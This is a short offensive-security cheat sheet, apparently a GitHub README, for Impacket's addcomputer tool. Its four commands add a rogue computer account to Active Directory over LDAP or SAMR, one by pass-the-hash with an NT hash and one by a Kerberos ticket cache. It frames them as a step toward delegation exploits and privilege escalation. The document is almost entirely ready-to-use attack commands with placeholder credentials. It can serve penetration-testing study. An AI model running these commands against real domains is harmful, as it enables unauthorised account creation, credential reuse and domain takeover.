<h1 align="center">Impacket AddComputer Cheat Sheet</h1>

<p align="center">
  Advanced reference guide for provisioning new computer objects in Active Directory via LDAP/SAMR to facilitate delegation exploits and privilege escalation.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Active_Directory-111827?style=for-the-badge&logo=microsoft&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/Impacket-AddComputer-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-AD_Exploitation-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>


```
impacket-addcomputer dominio.local/usuario_valido:Password123 -computer-name 'PRUEBA-PC$' -computer-pass 'MaliciousPass123!' -dc-ip IP_DEL_DC
```
> Via LDAP
```
impacket-addcomputer dominio.local/usuario_valido:Password123 -computer-name 'PRUEBA-PC$' -computer-pass 'MaliciousPass123!' -dc-ip IP_DEL_DC -method SAMR
```
> Via SAMR
```
impacket-addcomputer dominio.local/usuario_valido -hashes :HASH_NT -computer-name 'PRUEBA-PC$' -computer-pass 'MaliciousPass123!' -dc-ip IP_DEL_DC
```
> Via Pass-the-Hash
```
impacket-addcomputer dominio.local/usuario_valido -k -no-pass -computer-name 'ATTACK-PC$' -computer-pass 'MaliciousPass123!' -dc-ip IP_DEL_DC
```
> Autenticación Kerberos (Pass-the-Ticket)
> Si ya cuentas con un Ticket-Granting Ticket (ccache) válido cargado en tu variable de entorno de Linux (export KRB5CCNAME=/ruta/ticket.ccache):

